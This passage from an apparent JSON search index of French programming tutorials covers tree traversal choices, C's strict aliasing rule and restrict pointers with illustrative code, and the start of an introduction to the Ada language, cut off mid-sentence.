l'arbre. Je parle de $O(H)$ et $O(L)$ ici, mais ça ne vous apporte pas grand chose : un arbre à $N$ éléments, c'est parlant, mais comment avoir une idée des valeurs de $H$ et $L$ ? Si vous ne connaissez pas les arbres qu'on va vous donner, c'est difficile de le savoir. Une approximation pessimiste est de se dire que $H$ et $L$ sont toujours inférieurs à $N$, le nombre de noeuds de l'arbre. En effet, dans le \"pire cas\" pour $H$, chaque noeud a un seul enfant, et sa hauteur est donc $N$ (vous pouvez remarquer que cela correspond exactement à une liste). Dans le \"pire cas\" pour $H$, la racine a $N-1$ enfants, donc $H = N-1 = O(N)$. On peut donc dire que les complexités mémoires des parcours d'arbres sont en $O(N)$. Si j'ai tenu à vous parler de $H$ et $L$, c'est parce que dans la plupart des cas on peut avoir des estimations plus précises de leurs valeurs. En particulier, on verra plus tard que $H$ est souvent nettement plus petit que $N$. Utilisation en pratique Dans quels cas utiliser plutôt un parcours ou l'autre ? Le parcours en profondeur est le plus simple à implémenter (par la récursivité), donc si vous avez besoin de parcourir tout l'arbre c'est un bon choix; par exemple, on peut coder la fonction \"taille d'un arbre\" en utilisant un parcours en largeur (il suffit d'incrémenter un compteur à chaque noeud parcouru), mais c'est nettement plus compliqué (et donc sans doute un peu plus lent) et ça n'apporte rien. De même, si on veut trouver \"tous les noeuds qui vérifient la propriété donnée\" (par exemple \"leur valeur est supérieure à 100\" ou \"ils représentent une salle du labyrinthe qui contient un trésor\"), les deux méthodes de parcours sont aussi bien, et il vaut mieux utiliser le parcours en profondeur qui est plus simple. Si on cherche \"un noeud qui vérifie la propriété donnée\", les deux parcours sont tous les deux aussi bien. Il y a un cas cependant où le parcours en largeur est le bon choix : quand on a besoin de la propriété de \"distance à la racine\" du parcours en largeur. Pour développer mon exemple précédent, imaginez que l'arbre décrit le plan d'un labyrinthe : l'entrée est à la racine, et quand vous êtes dans la salle correspondant à un noeud, vous pouvez vous rendre dans les salles enfant (ou remonter dans la salle parent). Certains noeuds contiennent des trésors; vous voulez que votre algorithme vous donne, pas la liste des trésors, pas une seule salle qui contient un trésor, mais le trésor le plus proche de l'entrée (qui est aussi la sortie). Alors il faut utiliser un parcours en largeur : il va visiter les cases les plus proches de la racine en premier. Dès que vous aurez trouvé un trésor, vous savez que c'est le trésor le plus proche de l'entrée, ou en tout cas un des trésors les plus proches : il y a peut-être d'autres trésors dans la même couche. Un parcours en profondeur ne permet pas cela : le premier trésor qu'il trouve peut être très profond dans l'arbre, très loin dans la racine (imaginez sur notre exemple qu'il y a un trésor en E et en C). Pour résumer, le parcours en profondeur est très bien pour répondre aux questions du style \"le nombre total de ...\", \"la liste des ...\", \"le plus long chemin qui ...\", et le parcours en largeur pour les questions du style \"le plus court chemin qui ..\", \"le noeud le plus proche qui ...\", \"la liste des .. en ordre de distance croissante\". Ce n'est pas fini ! Comme vous l'avez peut-être deviné, le tutoriel est encore en cours de rédaction, et nous sommes en train de l'adapter pour Progdupeu.pl. De prochains chapitres devraient bientôt apparaître, et l'organisation des parties est susceptible de changer. Si vous souhaitez contribuer, n'hésitez pas à nous le faire savoir sur le forum !"},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/aliasing-et-pointeurs-restreints","title":"Aliasing et pointeurs restreints","text":"Depuis ses débuts, le langage C pose un problème assez gênant aux compilateurs désireux d'optimiser le code, dû à son utilisation massive des pointeurs : le risque d' aliasing (ou « risque de chevauchement »). Les normes successives ont tenté de l'atténuer à l'aide de la règle de strict aliasing (C89) et des pointeurs restreints (C99) ; deux concepts qui vont retenir notre attention dans ce tutoriel. Une histoire d'aliasing Rappels La notion d'objet La notion de lvalue Présentation de la notion d'aliasing Problématique d'optimisation du compilateur Problèmes causés par les alias au compilateur Analyse d'alias par le compilateur La règle de strict aliasing Normalisation de la règle de strict aliasing La norme C89 La norme C99 Illustrations de la règle de strict aliasing Exemples Bénéfices pour le compilateur Paramétrage du compilateur gcc Les pointeurs restreints Introduction aux pointeurs restreints Le qualificateur restrict Définition Quelques exemples Bénéfice des pointeurs restreints La vectorisation Exemple (1) Exemple (2) Dangers des pointeurs restreints Confusion entre appelant et appelé Précautions d'utilisation Une optimisation vraiment valable ? Liens externes Alias et optimisation Analyse d'alias Règle de strict aliasing Paramétrage du compilateur Les pointeurs restreints Une histoire d'aliasing Dans un premier temps, nous allons découvrir cette notion d' aliasing et voir en quoi elle complique le travail du compilateur. Rappels La notion d'objet C11 (N1570), § 3.15, Terms, definitions, and symbols, al. 1, p. 6. object: region of data storage in the execution environment, the contents of which can represent values. Le terme d' objet , qui sera au centre de nos discussions futures, désigne simplement une zone mémoire pouvant contenir des données. La notion de lvalue C11 (N1570), § 6.3.2.1, Lvalues, arrays, and function designators, al. 1, p. 54. An lvalue is an expression that [...] designates an object [...]. Une lvalue est une expression qui désigne un objet (que ce soit pour un accès ou une modification). int i ; int j ; int * p ; /* * `p' est une lvalue car elle modifie un objet. * `&i' n'est pas une lvalue. */ p = & i ; /* `i' est une lvalue car elle modifie un objet. */ i = 10 ; /* * `j' est une lvalue car elle modifie un objet. * `i' est une lvalue car elle accède à un objet. */ j = i ; /* `*p' est une lvalue car elle modifie un objet. */ * p = 30 ; Gardez bien ces deux notions à l'esprit ; nous allons en avoir besoin. Présentation de la notion d'aliasing En programmation, un cas d' aliasing se produit lorsque plusieurs lvalues désignent le même objet ; celles-ci sont alors qualifiées d' alias . Note Certaines de ces situations dépassent le cadre du présent tutoriel. Pour notre part, nous nous intéresserons uniquement aux alias résultant de l'utilisation de pointeurs, car ce sont ceux qui engendrent les difficultés les plus importantes. Par exemple, dans le code source ci-dessous, *p est un alias de n , c'est-à-dire que toute modification de *p aura une répercussion sur la valeur de n et vice versa . int n ; int * p = & n ; Cette définition peut paraître simple, mais elle comporte aussi sa part de subtilités. int a [ 2 ][ 10 ]; int * p = a [ 0 ]; int * q = a [ 1 ]; On serait ici tenté de dire que les lvalues *p et *q accèdent au même objet (le tableau a ), pourtant il n'en est rien. En effet, il ne faut pas perdre de vue que la notion d'objet est étrangère à celle de type. Dès lors, un même objet peut être subdivisé en deux autres, indépendants l'un de l'autre. *p et *q ne sont donc pas des alias. De la même manière, dans le code ci-dessous, *p , *q , *r et *s ne le sont pas non plus. char a [ 4 ]; char * p = a + 0 ; char * q = a + 1 ; char * r = a + 2 ; char * s = a + 3 ; Cette division fonctionne jusqu'au plus petit objet possible (à savoir un bit dans le cas des champs de bits ). Ainsi, a.i n'est pas un alias de a.j . struct s { unsigned int i : 1 ; unsigned int j : 1 ; }; struct s a ; Problématique d'optimisation du compilateur Si les relations d' aliasing qui existent entre les différentes lvalues du programme ne sont pas préoccupantes pour le programmeur, cela l'est plus pour le compilateur, qui peut être gêné dans son travail d'optimisation. Problèmes causés par les alias au compilateur Après avoir vérifié que le code source est syntaxiquement correct, le compilateur entre dans une seconde phase : celle de l' optimisation de code . Cette étape consiste simplement en la modification du code dans le but que l'exécution du programme se déroule le plus rapidement possible. Pour cela, il va prendre en compte certains éléments de l'implémentation, comme les différentes instructions dont dispose le processeur. Pour le moment, nous nous concentrerons uniquement sur une des optimisations les plus basiques : la réorganisation du code . Un exemple vaudra mieux qu'un long discours. #include <stdio.h> void f ( void ) { const int n = 5 ; printf ( \"%d \\n \" , n ); } Ici, force est de constater que l'instruction de la ligne 6 est inutile, puisque la variable n n'est pas modifiée. Aussi le compilateur pourra-t-il, par exemple, remplacer le code d'appel de cette fonction par un simple printf(\"%d \", 5) . Le problème dans tout cela, c'est que l'aliasing complique cette réorganisation. En effet, dans le code ci-dessous, on peut se dire à première vue que le compilateur pourrait supprimer la ligne 8 et remplacer l'instruction de la ligne 10. Or, si les lvalues *p et n sont des alias, le résultat attendu est complètement différent (10 en l'occurrence). Par conséquent, compte tenu du risque d'aliasing, le compilateur est obligé de laisser ces instructions telles quelles (ce qui peut, à long terme, ralentir l'exécution du programme). #include <stdio.h> static int n ; void f ( int * p ) { n = 5 ; * p = 10 ; printf ( \"%d \\n \" , n ); } Analyse d'alias par le compilateur L' analyse d'alias , c'est-à-dire la recherche des situations d' aliasing dans un programme donné, est donc nécessaire pour le compilateur, afin de pouvoir déterminer quels cas peuvent permettre telle ou telle optimisation. Peu importe le résultat de cette analyse (alias ou pas) : dans les deux cas, une optimisation pourra être effectuée. La seule situation problématique se produit lorsqu'on ne peut pas déterminer, lors de la compilation, les relations d' aliasing qui existent entre deux lvalues . Le compilateur est alors obligé de considérer le pire des cas : on parle d' aliasing pessimiste . * p = 4 ; * q = 6 ; n = * p + * q ; Avec uniquement ces informations, le compilateur se retrouve face à trois cas distincts (en supposant que *p , *q et n sont de type int ) : si *p et *q ne sont pas des alias, alors n = *p + *q pourra être remplacé par n = 10 ; si *p et *q sont des alias, alors n = *p + *q pourra être remplacé par n = 12 ; si il est impossible de déterminer les relations d' aliasing qui existent entre *p et *q , alors le code ne pourra pas être modifié. Le compilateur se doit donc d'effectuer une analyse d'alias pertinente pour sélectionner une de ces affirmations (et, si possible, une des deux premières). Dans cette optique, beaucoup algorithmes ont été développés. Néanmoins, en pratique, la plupart sont trop lourds pour être intégrés aux compilateurs courants, si bien que ces derniers se contentent généralement d'une analyse superficielle (ce qui peut se révéler pénalisant pour les performances). La règle de strict aliasing Nous avons donc vu en quoi il était important pour le travail d'optimisation du compilateur de connaître les relations d' aliasing qui existent entre les lvalues du programme. Cette préoccupation a été au centre de beaucoup de critiques du langage C à ses débuts, qui lui reprochaient son imprécision dans l'analyse des pointeurs. Aussi la norme aide-t-elle l'analyse d'alias avec un premier concept : la règle de strict aliasing . Normalisation de la règle de strict aliasing Nous allons maintenant faire un petit tour d'horizon de la définition et de la normalisation de cette règle en suivant un ordre chronologique (de son inauguration dans la norme C89 à sa précision dans la norme C99). La norme C89 C'est en 1989 que le comité de l'ANSI décida de l'instaurer, dans le but de réduire le nombre de cas d' aliasing pessimistes. Grâce à cela, le compilateur a pu affiner son analyse d'alias en présumant des lvalues comme n'étant pas des alias en fonction de leur type et de celui de l'objet qu'elles désignent. Rappel Un objet n'a techniquement pas de type (ce n'est qu'une zone mémoire pouvant contenir des données). Cependant, afin de faciliter l'analyse d'alias, la norme leur en a fixé fictivement un. Voyons maintenant l'énoncé de la règle. C89 (X3J11/88-090), § 3.3, Expressions, al. 6. An object shall have its stored value accessed only by an lvalue that has one of the following types : the declared type of the object ; a qualified version of the declared type of the object ; a type that is the signed or unsigned type corresponding to the declared type of the object ; a type that is the signed or unsigned type corresponding to a qualified version of the declared type of the object ; an aggregate or union type that includes one of the aforementioned types among its members (including, recursively, a member of a subaggregate or contained union) ; or a character type. Un objet ne peut être accédé que par une lvalue qui a un des types suivants : un type identique au type déclaré de l'objet ; une version qualifiée du type déclaré de l'objet ; un type qui est le type signé ou non signé correspondant au type déclaré de l'objet ; un type qui est le type signé ou non signé correspondant à une version qualifiée du type déclaré de l'objet ; un agrégat ou une union qui inclut un des types mentionnés ci-dessus parmi ses membres (incluant, de manière récursive, les sous-agrégats ou les sous-unions) ; un type caractère. La norme se base sur le type déclaré de l'objet, qui lui est attribué lors de sa définition. Par exemple, dans le code ci-dessous, deux objets sont créés, ayant respectivement comme type déclaré le type int et le type double . int n ; double x ; La norme C99 La norme C99 a peaufiné cette règle en la rapportant, non plus au type déclaré, mais au type effectif de l'objet, une nouvelle notion qui permet de mieux gérer le cas dans lequel l'objet ne dispose pas de de type déclaré. Cela vise essentiellement les objets alloués dynamiquement, puisque ces derniers ne sont pas créés lors d'une définition, mais lors d'un appel à une fonction d'allocation. C99 (N1256), § 6.5, Expressions, al. 6, pp. 67-68. The effective type of an object for an access to its stored value is the declared type of the object, if any. If a value is stored into an object having no declared type through an lvalue having a type that is not a character type, then the type of the lvalue becomes the effective type of the object for that access and for subsequent accesses that do not modify the stored value. If a value is copied into an object having no declared type using memcpy or memmove, or is copied as an array of character type, then the effective type of the modified object for that access and for subsequent accesses that do not modify the value is the effective type of the object from which the value is copied, if it has one. For all other accesses to an object having no declared type, the effective type of the object is simply the type of the lvalue used for the access. Dans le cas où un objet n'a pas de type déclaré, son type effectif est : celui de la lvalue le désignant (accès ou modification) ; celui de l'objet dont le contenu y a été copié à l'aide de memcpy ou memmove . #include <stdlib.h> int * p = malloc ( sizeof * p ); /* * Le type de l'objet désigné par la lvalue `*p' prend le type * `int'. */ * p = 10 ; /* * Le type de l'objet désigné par la lvalue `*p' prend le type * `unsigned int'. */ * ( unsigned int * ) p = 20U ; Pour conclure, notons que la norme C11 n'a pas changé l'énoncé de la règle. Illustrations de la règle de strict aliasing Vous devriez maintenant être au point avec la définition et la normalisation de la règle de strict aliasing . Pour illustrer un peu nos propos, nous étudierons tout d'abord quelques exemples et contre-exemples, puis nous verrons quel intérêt le compilateur peut tirer de tout cela. Exemples La question sera de savoir, pour chacune des lignes de code ci-dessous, si l'utilisation de l'alias créé est autorisé. unsigned int n ; /* * Correct, car la lvalue `*p' a un type qui est une version * qualifiée du type effectif de l'objet. */ const unsigned int * p = & n ; /* * Incorrect, car la lvalue `*q' a un type qui n'est ni une version * qualifiée du type déclaré de l'objet, ni le type signé ou non * signé correspondant, ni un type caractère. */ long int * q = ( long int * ) & n ; /* * Correct, car la lvalue `*r' a un type qui est le type signé * correspondant à une version qualifiée du type effectif de l'objet. */ const int * r = & n ; /* Correct, car la lvalue `*s' a un type caractère. */ signed char * s = ( signed char * ) & n ; Mentionnons que toutes ces règles s'appliquent uniquement lors du déférencement, ce qui autorise donc en soi l'affectation (bien que, naturellement, le champ d'action du pointeur soit par la suite réduit puisqu'il sera interdit de le déférencer). int n ; /* Correct : `p' n'est pas déférencé. */ short int * p = ( short int * ) & n ; /* Incorrect : `p' est déférencé. */ * p = 10 ; Bénéfices pour le compilateur Pour le compilateur, le plus intéressant reste la conséquence de cette règle, c'est-à-dire qu'en dehors des accès autorisés mentionnés ci-dessus, deux lvalues ne désigneront jamais un même objet. Dans cet exemple, la règle de strict aliasing est brisée car *p a un type qui n'est ni une version qualifiée du type déclaré de l'objet, ni le type signé ou non signé correspondant, ni un type caractère. Les lvalues *p et n ne seront donc pas considérées comme des alias lors de la phase d'optimisation (bien qu'en vérité elles le soient). Voilà qui facilite bien l'analyse d'alias ! Paramétrage du compilateur gcc Avec le compilateur gcc, la règle de strict aliasing n'est activée par défaut que dans les niveaux d'optimisation. Toutefois, il est possible pour le programmeur de spécifier explicitement si il veut que son code subisse les vérifications associées, à l'aide des options -fstrict-aliasing (respect strict de la règle) et -fno-strict-aliasing (tolérance de comportements non conformes à la règle). Si l'utilisation pertinente de l'option -fno-strict-aliasing peut vous paraître dangereuse, puisque le code n'est alors plus conforme à la norme, l'histoire retient que de grands noms l'ont soutenu (le noyau Linux pour ne citer que lui). gcc dispose notamment d'un avertissement permettant de prévenir les situation non conformes à la règle de strict aliasing . warning: dereferencing type-punned pointer will break strict-aliasing rules L'option permettant de gérer de tels affichages est -Wstrict-aliasing[=n] , avec n compris entre 1 et 3 (niveau 3 par défaut). Plus n est petit, plus gcc fera de vérifications (par exemple, avec n = 1 ou n = 2 , l'avertissement peut se déclencher même si le pointeur n'est pas déférencé). De même, le pourcentage de faux positifs et de faux négatifs dépend du niveau utilisé. Par exemple, avec gcc 4.4.5, l'avertissement ne se déclare qu'aux niveaux 1 et 2 pour ce code, au niveau de l'instruction d'affectation (ligne 5). int main ( void ) { unsigned int n ; long int * p = ( long int * ) & n ; * p = 10L ; return 0 ; } Si la règle de strict aliasing constitue une aide réelle à l'analyse d'alias des compilateurs, il reste encore le cas des alias de type identique (ou ne différant que par le signe et/ou par le qualificateur, ainsi que celui des types caractères). Il est évident qu'on ne peut pas interdire cette pratique, qui signifierait l'abolition des pointeurs ! Mais c'est à ce moment-là que le programmeur entre en scène avec l' aliasing spécifié, thème qui fera l'objet de notre prochaine sous-partie. Les pointeurs restreints Malgré cette règle, il reste donc encore quelques situations d' aliasing compromettantes. Comme la norme et les compilateurs ne peuvent plus faire d'hypothèses supplémentaires, c'est le programmeur lui-même qui est sollicité. Introduction aux pointeurs restreints L' aliasing spécifié par le développeur est implémenté dans la norme C99 sous la forme de la notion de pointeur restreint . L'idée est de permettre la mise en place d'un droit exclusif d'accès sur un objet référencé par un pointeur qualifié de restreint. Ce droit ne peut être transmis qu'à des lvalues dérivées de ce pointeur, c'est-à-dire qui ont obtenu l'adresse de l'objet via celui-ci. Le qualificateur restrict Pour déclarer un pointeur restreint, la norme C99 a mis à la disposition des programmeurs un nouveau qualificateur : restrict . Il est applicable uniquement aux pointeurs sur objet ; il doit donc être placé, lors de la déclaration, après le symbole * . /* `p' est un pointeur restreint sur `int'. */ int * restrict p ; /* `q' est un pointeur sur pointeur restreint sur `int'. */ int * restrict * q : /* `r' est un pointeur restreint sur pointeur sur `int'. */ int ** restrict r ; Définition Le passage à propos de restrict dans la norme C99 peut paraître alambiqué et tordu ; nous vous ferons donc grâce des citations. L'essentiel du fonctionnement des pointeurs restreints peut se résumer dans les deux règles suivantes. il ne peut y avoir qu'un seul pointeur restreint référençant un même objet dans un même bloc ; une lvalue ne peut modifier un objet référencé par un pointeur restreint que si elle est dérivée de ce dernier. Quelques exemples À ce stade, la définition peut vous paraître encore un peu floue, c'est pourquoi nous vous proposons quelques petits exemples. #include <stdlib.h> static char * restrict r , * restrict s ; void copy ( void * restrict dst , void * restrict src , size_t n ) { /* * Valide car `p' et `q' ne sont pas des pointeurs * restreints. */ char * p = dst ; char * q = src ; while ( n -- != 0 ) { /* * Valide car les lvalues `*p' et `*q' sont * respectivement basées sur les pointeurs restreints * `dst' et `src'. */ * p ++ = * q ++ ; } /* * Invalide car `r' et `s' sont des pointeurs restreints et * référencent, respectivement, les mêmes objets que `dst' et * `src' dans le bloc de la fonction `copy'. */ * r = * s ; } int main ( void ) { /* * Valide car `r' et `s' référencent deux objets différents * dans le bloc de la fonction main. */ r = malloc ( 10 ); s = malloc ( 10 ); /* * Valide car `dst' et `src' référencent deux objets * différents dans le bloc de la fonction `copy'. */ copy ( r , s , 10 ); /* * Invalide car `dst' et `src' référencent le même objet dans * le bloc de la fonction `copy'. */ copy ( r , r , 10 ); /* * Invalide car `r' et `s' référencent alors le même objet * dans le bloc de la fonction main. */ r = s ; return 0 ; } Bien qu'il soit techniquement possible d'assigner des pointeurs restreints à des pointeurs non restreints, c'est une pratique déconseillée car cela peut compliquer le travail d'optimisation du compilateur. Bénéfice des pointeurs restreints À l'instar de la règle de strict aliasing , les pointeurs restreints permettent aux compilateurs d'effectuer des présomptions quant aux relations d' aliasing qui existent entre les pointeurs d'un même bloc. En effet, deux pointeurs restreints sont garantis de ne pas être des alias. Ainsi, c'est toute la phase d'optimisation de code qui en profite, et notamment la réorganisation du code. La vectorisation De plus, étant donné que le mot-clé restrict vise des pointeurs de même type, cela laisse également place à une optimisation plus poussée faisant intervenir les tableaux : la vectorisation . Cette dernière pratique consiste à effectuer des opérations sur des petits tableaux de taille fixe plutôt que sur un seul élément à la fois. Cela est possible sur la plupart des processeurs modernes, qui disposent d'instructions spécialisées travaillant sur plusieurs éléments à la fois : les instructions vectorielles . Dans les exemples suivants, nous considérerons un processeur disposant d'instructions vectorielles capables de travailler sur 128 bits , c'est-à-dire ici de 16 char ou de 4 int . Elles seront illustrées par les trois fonctions suivantes : vect_cpy16 : copie un tableau de 16 char ; vect_cpy4 : copie un tableau de 4 int ; vect_add4 : additionne deux tableaux de 4 int et stocke le résultat dans le premier. Exemple (1) void memcpy ( void * restrict dst , void * restrict src , size_t n ) { char * p = dst ; char * q = src ; while ( n -- != 0 ) * p ++ = * q ++ ; } Dans le code ci-dessus, la règle de strict aliasing est inutile car les lvalues *p et *q sont toutes deux de type char . En revanche, elles sont basées sur un pointeur restreint et sont donc garanties de ne pas être des alias. Le compilateur pourrait donc vectoriser cette boucle, en copiant des tableaux de taille fixe plutôt que des char un par un. void memcpy ( void * restrict dst , void * restrict src , size_t n ) { char * p = dst ; char * q = src ; size_t i ; for ( i = 0 ; n - i >= 16 ; i += 16 ) vect_cpy16 ( p + i , q + i ); for (; i < n ; ++ i ) p [ i ] = q [ i ]; } Exemple (2) void vect_add ( int * restrict res , int * restrict a , int * restrict b , size_t n ) { for ( size_t i = 0 ; i < n ; ++ i ) res [ i ] = a [ i ] + b [ i ]; } De la même manière, le code ci-dessus opère sur des lvalues basées sur des pointeurs restreints. Ainsi, le compilateur pourrait utiliser des instructions vectorielles afin d'optimiser le code comme suit. void vect_add ( int * restrict res , int * restrict a , int * restrict b , size_t n ) { size_t i ; for ( i = 0 ; n - i >= 4 ; i += 4 ) { vect_cpy4 ( res + i , a + i ); vect_add4 ( res + i , b + i ); } for (; i < n ; ++ i ) res [ i ] = a [ i ] + b [ i ]; } Dangers des pointeurs restreints Malgré tout, il est important de prendre des précautions lors de l'utilisation des pointeurs restreints ; ils ne doivent en effet pas être utilisés à tout-va. Confusion entre appelant et appelé Si deux pointeurs sont indiqués comme étant restreints mais, qu'en réalité, ils se chevauchent, le résultat est indéterminé et le code produit a de fortes chances d'être incorrect. #include <string.h> void f ( void ) { int a [ 8 ] = { 0 , 0 , 45 , 42 , 12 , 89 , 2 , 36 }; /* * Les deux arguments restreints de `memcpy' se chevauchent, * c'est une situation de comportement indéterminé. */ memcpy ( a , a + 2 , 6 ); } Or, nous pouvons remarquer que c'est à la fonction appelée de préciser si les arguments doivent être restreints, mais seule la fonction appelante peut contrôler si ces arguments sont conformes (le compilateur ne peut pas faire cette vérification par lui-même). Précautions d'utilisation On distingue deux grands cas dans lesquels on peut utiliser les pointeurs restreints. Si l'algorithme de la fonction ne fonctionne pas ou n'a aucun sens dans le cas où les paramètres se chevauchent, alors le résultat avec les pointeurs restreints sera toujours incorrect, mais pourra avoir changé. Par exemple, le chevauchement des deux paramètres dans la fonction fopen serait complètement absurde. Si le principe de la fonction a un sens dans le cas où les arguments se chevauchent mais que cela est pénalisant pour les optimisations, alors il est préférable de créer deux versions de la fonction (une avec restrict et une sans), à la manière des fonctions memcpy et memmove . Attention Lors d'un comportement indéterminé, théoriquement, tout peut se passer. Le compilateur a donc tout à fait le droit de produire un code qui arrête brutalement le programme pour éviter de propager une éventuelle erreur. C'est pourquoi il ne faut pas oublier de prévenir l'utilisateur de ces spécifications dans la documentation de la fonction. C'est par exemple le cas pour la fonction memcpy . Au final, on peut représenter tout cela par une sorte de contrat passé entre les deux fonctions. Si il n'est pas respecté par la fonction appelante, alors la fonction appelée se réserve le droit de produire un code incorrect. Une optimisation vraiment valable ? Il ne faut pas oublier que restrict est une simple indication et pas une obligation pour le compilateur. Aussi les détracteurs du mot-clé ont-ils souvent souligné le fait que le gain de temps octroyé par l'utilisation des pointeurs restreints n'est pas toujours très important (par exemple, les processeurs qui ne disposent pas d'instructions vectorielles ne jouiront pas de cette optimisation). Nous pouvons donc légitimement nous demander si l'utilisation des pointeurs restreints est réellement rentable par rapport à l'effort de réflexion associé (qui est loin d'être négligeable). Plusieurs travaux ont conclu que ce n'était pas le cas, et déconseillent donc l' aliasing spécifié. À vous de vous forger votre propre avis ; n'hésitez pas, dans cette optique, à construire vos propres étalonnages suivant votre utilisation du langage. En tout cas, si vous êtes prêts à fournir un effort supplémentaire pour un bénéfice, si minimal qu'il soit, vous voilà informés ! Ainsi, ce tutoriel touche à sa fin. Nous espérons vous avoir éclairé sur ce difficile sujet d'aliasing et de pointeurs restreints. La norme du langage C est, aujourd'hui encore, une des seules normes de langage de programmation qui prône l'optimisation des compilateurs, le C cherche donc toujours à prouver ses qualités en performances pures. Liens externes Alias et optimisation (en) Optimisation de code par le compilateur sur Wikipédia . (en) Optimisation de boucles sur Wikipédia . (fr) Pipeline des instructions sur Wikipédia . (en) Les processeurs vectoriels sur Wikipédia . (en) Guide de programmation pour la vectorisation des compilateurs C/C++ . Analyse d'alias (en) Analyse d'alias sur Wikipédia . (en) Exemple d'algorithme effectuant une analyse d'alias performante . (en) L'analyse d'alias de gcc . Règle de strict aliasing (en) Comprendre le strict aliasing . (en) Type-punning et strict aliasing . (en) Comprendre le strict aliasing en C/C++ . Paramétrage du compilateur (en) Voir les raisons de l'utilisation de -fno-strict-aliasing dans le noyau Linux . (en) Page de manuel de gcc (recherchez « -fstrict-aliasing ») . Les pointeurs restreints (fr) Le C et ses raisons : les pointeurs restreints . (en) Les pointeurs restreints en C . (en) Defect Report #294 . (en) Démystification du mot-clé restrict . (en) Pourquoi l' aliasing spécifié est une mauvaise idée ."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/breve-presentation-du-langage-ada","title":"Brève présentation du langage Ada","text":"Pourquoi Ada ? Historique (très résumé) Caractéristiques Le typage fort La modularité La lisibilité Bas niveau Utilisations Manque de popularité Comment programmer en Ada ? Trouver des cours Trouver des outils Un petit mot sur SPARK Conclusion Pourquoi Ada ? Historique (très résumé) Ada est un langage qui fut créé vers la même époque que le C++ par le Département de la Défense des États-Unis . Cependant, on remarque aujourd'hui que l'on parle beaucoup plus du langage C++ que d'Ada. En effet, Ada n'a pas réussi à s'imposer face au C++ a l'époque et cela se fait bien ressentir de nos jours ; cependant il n'en reste pas moins un langage intéressant, il est encore utilisé dans certains domaines et possède un développement toujours actif (la dernière spécification validée à cette date se prénommant « Ada 2012 »). Caractéristiques Ada est avant tout un langage de programmation impératif (voire objet, mais je ne l'ai pas encore utilisé de cette façon). Voici le fameux exemple du « Hello world! » appliqué à ce langage : with Ada.Text_IO ; use Ada.Text_IO ; procedure Hello is begin Put_Line ( \"Hello, world!\" ); end Hello ; Le typage fort Le langage Ada est un langage que l'on qualifie de « fortement typé ». Cela veut dire que l'on ne pourra pas faire n'importe quoi avec les types et qu'il faudra expliciter chaque conversion que l'on veut faire : on ne pourra pas convertir implicitement un float en double par exemple. Exemple : les intervalles Ada permet l'utilisation d'intervalles ( ranges ) et vous en rencontrerez assez souvent. Ces intervalles permettent de créer de nouveaux types et on aura alors l'assurance qu'une variable de ce type aura une valeur comprise dans cet intervalle. Par exemple, on peut définir un octet comme un entier dans l'intervalle (0..255) ou alors un jour du mois dans l'intervalle (1..31) et on est assuré que les variables du type JourDuMois auront une valeur comprise dans l'intervalle. Ada fourni des intervalles comme Natural qui représente en fait un entier positif (compris entre 0 et la valeur maximale du type Integer que l'on peut obtenir par Integer'Last ). La modularité Ada permet et encourage l'écriture de modules dans le but de séparer un programme complexe dans plusieurs fichiers. Cela permet d'entreprendre la création de gros programmes sans pour autant s'y perdre. On notera que pour accèder aux élements d'un module, il faudra par défaut les précéder du nom du module, comme par exemple Ada.Text_IO.New_Line (mais on retrouve comme en C++ avec using namespace une instruction nommée use qui permet de s'affranchir de cette notation, bien que cela reste facultatif). Le chargement des modules utilisés, lui, est obligatoire et se fait à l'aide de l'instruction with , ce qui correspond un peu aux import du langage Python. De même qu'en C et C++, on retrouve le principe des fichiers headers (extension .ads ) et des fichiers d'implémentation (extension .adb ) permettant de séparer la déclaration et l'implémentation. On retrouve donc les mêmes avantages, notamment pouvoir connaitre les principaux types, fonctions et procédures contenus dans un module sans pour autant devoir visualiser l'implémentation. La lisibilité Beaucoup de programmeurs sont rebutés par la syntaxe du langage qui s'avère assez verbeuse. Néanmoins, Ada privilégie dans ses principes la relecture à la rédaction de programmes ; en effet, on relira beaucoup plus de fois un programme que l'on ne l'écrira. L'utilisation de mots clés complets tels que loop , begin ou end permettent de mieux comprendre le code en un coup d'œil au lieu d'avoir recours aux accolades ouvrantes/fermantes. Un des exemples de cette lisibilité est la possibilité d'utiliser des noms dans les end afin de savoir quel bloc on vient de quitter. Prenons l'exemple suivant : procedure Toto is begin -- Plein de code sur plusieurs lignes end Toto ; Même si on ne voit plus de début de la procédure, on sait que l'on quitte Toto à cet endroit précis du code. Au niveau des conventions de nommage, il faut savoir que l'on est relativement libre : en effet, la syntaxe du langage n'est pas sensible à la casse , ainsi, rien ne vous empêche d'écrire le code suivant si on reprend l'exemple ci-dessus : PRocedure toTO IS bEGIN -- Plein de code sur plusieurs lignes end TOTO ; Cependant, vous remarquez qu'on a bien perdu en lisibilité par rapport à l'exemple précédent. Il est donc courant d'adopter des conventions au niveau de la syntaxe dont les deux principales recommandations sont : Les variables/procédures/fonctions seront au format Ma_Super_Fonction . Les mots clés seront écrits en minuscules : declare , begin , end , etc. On remarquera également qu'il est possible d'utiliser les underscores pour rendre les nombres plus lisibles dans le code : Mon_Entier := 1_000_123 ; On peut également écrire des entiers en utilisant des bases allant de 2 à 16 : Mon_Entier := 13#42# ; -- On utilise ici une base 13, nativement Pour en savoir plus, voir ça : https://en.wikibooks.org/wiki/Ada_Style_Guide/Readability Bas niveau Ada permet de faire de la programmation bas niveau, des interruptions à la gestion manuelle de la mémoire avec des pointeurs (comme en C) afin de permettre de l'utiliser dans les systèmes embarqués par exemple. Cependant, typage fort oblige, on ne retrouve pas le moche void* du C (pointeur pouvant pointer vers n'importe quel type) et il serait inutile car Ada permet également la programmation générique . Utilisations Ada a été développé pour le département militaire des États-Unis et par conséquent ce langage est toujours utilisé dans ce domaine (nous pouvons par exemple citer l'hélicoptère Apache et les systèmes de combat des sous-marins de l'armée américaine ou encore les fusées Ariane 4 et 5). Cependant, on retrouve également ce langage dans le domaine civil et plus particulièrement dans les secteurs dits « critiques » tels que : la finance ; le médical ; les télécommunications ; les transports ; la gestion des centrales nucléaires. Ce langage a notamment été utilisé pour les systèmes de l'Airbus 380 ou encore le Boeing 787 au niveau de l'aviation. On retrouve aussi Ada dans le ferroviaire, par exemple dans les TGV de la SNCF ou encore… dans le métro de Paris ! Comme vous pouvez le voir, Ada est bel et bien présent autour de nous dans la vie de tous les jours sans que nous nous en rendions forcément compte ! Manque de popularité C'est ce qui – je pense – fait le plus d'ombre au langage. Ce problème est en fait dû par un lot de circonstances, parmi lesquelles : Les premiers compilateurs Ada coûtaient très cher et étaient à destination 